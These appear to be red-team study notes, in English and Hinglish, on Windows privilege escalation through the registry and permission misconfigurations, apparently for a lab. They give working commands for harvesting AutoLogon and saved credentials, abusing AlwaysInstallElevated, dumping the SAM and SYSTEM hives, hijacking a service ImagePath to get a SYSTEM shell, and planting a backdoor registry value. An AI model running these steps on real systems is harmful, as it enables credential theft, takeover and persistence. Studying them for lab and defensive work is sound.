
---

# 🧠 15. 🗄️ Registry Enumeration (CRITICAL for PrivEsc)

---

# 🔑 AutoRun / AutoLogon Credentials

## Check for stored credentials

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM /f password /t REG_SZ /s

If you want to save some time, query this specific key to find admin AutoLogon credentials:

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

winexe -U 'admin%password' //10.48.167.46 cmd.exe
```

👉 Look for:

* `DefaultUserName`
* `DefaultPassword` 🔥
* `AutoAdminLogon`

💥 If password exists → **instant admin login**

---

Here’s your **clean red-team level note** on `runas /savecred` + Credential Storage 👇

---

# 🔴 Windows PrivEsc – Saved Credentials (runas /savecred)

*(Red Team Operator Notes)*

---

# 🧠 1. Concept

👉 Windows allows users to **save credentials** for reuse

```text
runas /savecred
```

👉 Credentials stored in:

```text
Credential Manager (Windows Vault)
```

---

# 📍 2. Storage Locations

## Logical Storage

```text
Windows Credential Manager
```

---

## Physical Paths

```text
C:\Users\<username>\AppData\Local\Microsoft\Credentials\
C:\Users\<username>\AppData\Local\Microsoft\Vault\
```

---

# 🔒 3. Security Mechanism

👉 Credentials are:

* Encrypted using **DPAPI**
* Bound to **user context**

```text
Plaintext access ❌
Direct reading ❌
```

---

# 🔍 4. Enumeration

## List saved credentials

```bash
cmdkey /list
```

---

## Example Output

```text
Target: Domain:interactive=admin
User: admin
```

👉 💥 Indicates stored admin credentials

---

# 💣 5. Exploitation (IMPORTANT)

## Command

```bash
runas /savecred /user:admin C:\path\payload.exe
```

---

## What Happens

1. System finds saved credentials
2. No password prompt
3. Executes as target user

```text
💥 Code runs as admin
```

---

# ⚡ 6. Attack Chain

```text
cmdkey /list
↓
Saved creds found
↓
runas /savecred
↓
Execute payload
↓
💥 Privilege Escalation (Admin)
```

---

# ⚠️ 7. Conditions

✔ Credentials must be already saved
✔ Target user must exist
✔ Execution allowed

---

# 🚨 8. Limitations

❌ No SYSTEM shell directly
✔ But Admin access = high impact

---

# 🧬 9. Advanced Extraction (Post-Exploitation)

👉 If SYSTEM access obtained:

Tools:

* Mimikatz
* SharpDPAPI

👉 Can decrypt stored credentials

---

# 🛡️ 10. Detection (Blue Team)

Watch for:

```text
runas /savecred
cmdkey /list
```

👉 Suspicious behavior 🚨

---




# 🔐 AlwaysInstallElevated (MSI PrivEsc)

## Check both keys

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

👉 Look for:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

💥 If **both = 1** → MSI runs as SYSTEM

👉 Exploit:

```
msiexec /quiet /qn /i payload.msi
```

---

# 🛠️ Installed Software (Registry View)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

👉 Useful for:

* Finding vulnerable apps
* Hidden installs not shown in GUI

---

# ⚙️ Services via Registry

```
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

## Deep inspect a service

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
```

👉 Look for:

* `ImagePath` 🔥 (unquoted path)
* Weak permissions on service config

---

# 💣 Unquoted Service Path (Registry Angle)

Example:

```
ImagePath = C:\Program Files\Vuln App\service.exe
```

👉 Same abuse:

Drop malicious binary in:

```
C:\Program.exe
```

---

# 🧪 Startup Applications (Persistence + PrivEsc)

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

👉 Look for:

* Writable paths
* Custom scripts/binaries

---

# 🔄 RunOnce Keys

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

👉 Executes on next login → good for hijacking

---

# 🧬 Environment Variables Abuse

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
```

👉 Look for:

* PATH hijacking opportunities
* Writable directories in PATH

---

# 🧠 UAC Bypass Checks

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

👉 Key values:

* `EnableLUA`
* `ConsentPromptBehaviorAdmin`

💥 Weak UAC → easier escalation

---

# 🧨 IFEO (Image File Execution Options) Hijack

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

👉 Look for:

* `Debugger` entries

💥 Can force execution of your binary instead

---

# 🔍 SAM & Security Hives (Credential Dump Prep)

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

👉 Then extract hashes offline

---

# 🔥 Stored Credentials (LSA Secrets)

```
reg query HKLM\SECURITY\Policy\Secrets
```

👉 Requires SYSTEM → but **goldmine**

---

# 🧰 Registry Permissions Check

Use:

```
accesschk.exe -kvuqsw hklm\Software
```

👉 Look for:

* Writable registry keys 🔥
* Service config modification

---

# ⚡ Red Team Thinking (IMPORTANT)

When you see registry:

* ❓ Can I **write to this key?**
* ❓ Does this key control **execution?**
* ❓ Does it store **credentials?**
* ❓ Can I hijack **startup/service behavior?**

---

# 🚀 Pro Tip (Senior-Level Insight)

Most beginners:

❌ Just run `winPEAS` and copy output
✔ Real operators:

* Manually verify registry paths
* Chain:


---

# 🧠 16. 🔐 Permission Enumeration (CRITICAL)

*(Ye hi decide karta hai ki PrivEsc possible hai ya nahi)*

---

# 🛠️ AccessChk – Most Important Tool

### 🔹 Registry Key Permissions

```bash
accesschk.exe /accepteula -uvwqk hklm\system\currentcontrolset\services\regsvc
```

👉 Breakdown:

* `-u` → suppress errors
* `-v` → verbose
* `-w` → show **write access only** 🔥
* `-q` → quiet banner
* `-k` → registry key

👉 Goal:

✔ Check if **low-priv user can modify service registry key**

---

## 🔥 What to Look For

If you see:

```
RW BUILTIN\Users
```

👉 💥 GAME OVER:

You can:

* Modify service config
* Change `ImagePath`
* Point to malicious binary

---

# ⚙️ Service Permission Check

```bash
accesschk.exe /accepteula -ucqv regsvc
```

👉 Flags:

* `-u` → suppress errors
* `-c` → service
* `-q` → quiet
* `-v` → verbose

👉 Goal:

✔ Can you:

* Start/stop service
* Change config 🔥

---

# 📁 File / Directory Permissions

```bash
accesschk.exe /accepteula -uws "Users" C:\Program Files
```

👉 Flags:

* `-w` → writable
* `-s` → recursive

👉 Look for:

✔ Writable folders inside Program Files
✔ Replace binary → restart service → SYSTEM

---

# 👤 Check Specific User Permissions

```bash
accesschk.exe -uwcqv <username> *
```

👉 Shows:

* Where that user has write/control

---

# 🧬 Registry Wide Scan (Advanced)

```bash
accesschk.exe -kvuqsw hklm\Software
```

👉 🔥 Finds:

* Writable registry keys across system

---

# ⚡ PowerShell Alternative (No AccessChk)

## Check file permissions

```powershell
Get-Acl "C:\Path\file.exe"
```

---

## Check registry permissions

```powershell
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\regsvc"
```

---

# 🔥 Real Attack Flow (Important)

### Step 1: Find writable service key

```
accesschk → writable HKLM\Services
```

### Step 2: Modify registry

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
```

### Step 3: Restart service

```bash
net stop regsvc
net start regsvc
```

👉 💥 SYSTEM shell

---

# 🧠 Senior Operator Mindset

Har jagah ye socho:

* ❓ Kya mujhe **WRITE permission** hai?
* ❓ Kya ye **execution ko control karta hai?**
* ❓ Kya main ise **trigger kar sakta hu?**

---

# 🚨 Common Mistake (Important)

❌ Sirf ye dekhna:

```
sc qc service
```

✔ Ye bhi check karo:

```
accesschk → permissions
```

👉 Kyunki:

> Config visible ≠ Config modifiable

---

# 🔥 Golden Rule

> **"If you can WRITE → you can OWN the system."**

---


🧠 17. 🛠️ Modifying Registry Keys (PrivEsc Exploitation)
⚡ 1. Basic Syntax (MUST KNOW)
reg add <key> /v <value_name> /t <type> /d <data> /f

👉 Meaning:

<key> → registry path
/v → value name
/t → type (REG_SZ, REG_DWORD, etc.)
/d → data (what you want to set)
/f → force overwrite
🔥 2. Modify Service Binary Path (Most Common PrivEsc)
Step 1: Change ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f

👉 What happens:

Service ab tumhara binary run karega
Agar service SYSTEM me run ho rahi hai → 💥 SYSTEM shell
Step 2: Restart Service
net stop regsvc
net start regsvc

👉 Ya reboot ka wait karo agar restart permission nahi hai

🔐 3. Add New Registry Value
reg add HKLM\Software\test /v Backdoor /t REG_SZ /d "C:\temp\shell.exe" /f

👉 Useful for:

Persistence
Startup hijacking


